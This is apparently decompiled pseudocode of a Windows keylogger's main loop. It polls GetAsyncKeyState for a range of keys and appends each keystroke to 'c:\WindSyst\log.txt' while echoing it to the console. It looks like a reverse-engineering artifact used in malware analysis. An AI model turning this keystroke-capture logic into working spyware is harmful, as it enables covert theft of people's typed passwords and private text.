void FUN_00401640(void)

{
  code *pcVar1;
  char cVar2;
  SHORT SVar3;
  int iVar4;
  int vKey;
  char cStack_14a;
  char cStack_149;
  char *pcStack_148;
  int iStack_144;
  char acStack_140 [16];
  char *pcStack_130;
  int iStack_12c;
  char acStack_128 [16];
  code **appcStack_118 [2];
  code *pcStack_110;
  code **appcStack_10c [2];
  undefined1 auStack_104 [96];
  code **ppcStack_a4;
  undefined4 uStack_34;
  undefined1 uStack_30;
  undefined1 uStack_2f;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;

  pcVar1 = vtable_exref;
  do {
    vKey = 8;
    Sleep(10);
    do {
      SVar3 = GetAsyncKeyState(vKey);
      if (SVar3 == -0x7fff) {
        func_0x004020b0();
        uStack_30 = 0;
        ppcStack_a4 = &operator.new_exref;
        uStack_34 = 0;
        uStack_2f = 0;
        uStack_2c = 0;
        uStack_28 = 0;
        uStack_24 = 0;
        uStack_20 = 0;
        appcStack_118[0] = (code **)pcVar1;
        *(code **)((int)appcStack_118 + *(int *)(pcVar1 + -0xc)) = vtable_exref;
        appcStack_118[1] = (code **)0x0;
        func_0x004020a0(0);
        pcStack_110 = vtable_exref;
        *(code **)((int)appcStack_10c + *(int *)(vtable_exref + -0xc)
+ -4) = vtable_exref;
        func_0x004020a0(0);
        *(code **)((int)appcStack_118 + *(int *)(vtable_exref + -0xc))
= vtable_exref;
        appcStack_118[0] = &operator.delete_exref;
        ppcStack_a4 = (code
**)(s__ZN10QArrayData10deallocateEPS_j_004093fa + 0x12);
        pcStack_110 = (code *)&WORD_004093f8;
        func_0x004020e8();
        func_0x004020a0(appcStack_10c);
        iVar4 = func_0x004020f8("c:\\WindSyst\\log.txt",1);
        if (iVar4 == 0) {
          func_0x00402098(*(uint *)(auStack_104 +
(int)appcStack_118[0][-3]) | 4);
        }
        else {
          func_0x00402098(0);
        }
        cVar2 = func_0x00402110();
        if (cVar2 != '\0') {
          if (vKey - 8U < 0x19) {
            func_0x00401ed0(&pcStack_148,vKey);
            std::__ostream_insert<>((ostream
*)&cout_exref,pcStack_148,iStack_144);
            if (pcStack_148 != acStack_140) {
              operator.delete(pcStack_148);
            }
            func_0x00401ed0(&pcStack_130,vKey);
            std::__ostream_insert<>((ostream
*)&pcStack_110,pcStack_130,iStack_12c);
            if (pcStack_130 != acStack_128) {
              operator.delete(pcStack_130);
            }
          }
          else {
            cStack_14a = func_0x00401fb0(vKey);
            std::__ostream_insert<>((ostream *)&cout_exref,&cStack_14a,1);
            cStack_149 = func_0x00401fb0(vKey);
            std::__ostream_insert<>((ostream *)&pcStack_110,&cStack_149,1);
          }
          iVar4 = func_0x004020f0();
          if (iVar4 == 0) {
            func_0x00402098(*(uint *)(auStack_104 +
(int)appcStack_118[0][-3]) | 4);
          }
        }
        appcStack_118[0] = &operator.delete_exref;
        ppcStack_a4 = (code
**)(s__ZN10QArrayData10deallocateEPS_j_004093fa + 0x12);
        pcStack_110 = (code *)&WORD_004093f8;
        appcStack_10c[0] = &vtable_exref;
        func_0x004020f0();
        func_0x00402100();
        appcStack_10c[0] = &operator.delete_exref;
        func_0x004020d0();
        *(code **)((int)appcStack_118 + *(int *)(vtable_exref + -0xc))
= vtable_exref;
        *(code **)((int)appcStack_10c + *(int *)(vtable_exref + -0xc)
+ -4) = vtable_exref;
        *(code **)((int)appcStack_118 + *(int *)(pcVar1 + -0xc)) = vtable_exref;
        ppcStack_a4 = &operator.new_exref;
        func_0x004020a8();
      }
      vKey = vKey + 1;
    } while (vKey != 0xbf);
  } while( true );
}